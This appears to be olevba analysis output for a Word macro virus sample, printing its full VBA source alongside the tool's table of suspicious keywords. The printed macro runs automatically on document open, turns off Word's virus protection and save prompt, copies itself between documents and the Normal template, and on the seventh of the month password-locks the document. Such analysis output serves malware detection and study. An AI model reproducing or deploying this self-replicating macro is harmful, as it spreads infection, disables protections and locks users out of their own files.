olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ex
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ex - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO x.bas 
in file: ./Virus.MSWord.Ex - OLE stream: 'Macros/VBA/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auTOOPen()
On Error Resume Next
Set n = NormalTemplate.VBProject.VBComponents: Set d = ActiveDocument.VBProject.VBComponents: Set c = ActiveDocument
e = Chr(120): xz = "c:\x.sys": d(e).Export xz
Options.SaveNormalPrompt = False: Options.VirusProtection = False
If Day(Now()) = 7 Then c.Password = e
For i = 1 To n.Count
    If n(i).Name = e Then nx = -1
Next i
For i = 1 To d.Count
    If d(i).Name = e Then dx = -1
Next i
If nx = -1 And dx = 0 Then d.Import xz: c.SaveAs (c.FullName)
If nx = 0 And dx = -1 Then n.Import xz: NormalTemplate.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auTOOPen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

